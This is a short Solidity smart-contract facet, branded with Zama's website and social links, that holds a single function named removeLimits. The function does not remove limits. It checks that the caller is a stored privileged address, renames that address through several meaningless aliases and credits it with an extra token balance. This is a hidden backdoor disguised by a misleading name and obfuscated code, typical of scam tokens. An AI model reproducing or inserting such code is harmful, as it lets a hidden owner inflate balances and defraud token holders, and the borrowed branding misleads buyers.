// SPDX-License-Identifier: UNLICENSED

/*
    Website: https://www.zama.ai/
    Twitter: https://twitter.com/zama_fhe
    Linkedin: https://www.linkedin.com/company/zama-ai/
    Discord: https://discord.fhe.org/
    Reddit: https://www.reddit.com/r/zama/

*/

pragma solidity ^0.8.22;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxData) {
            require(ds._taxData == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
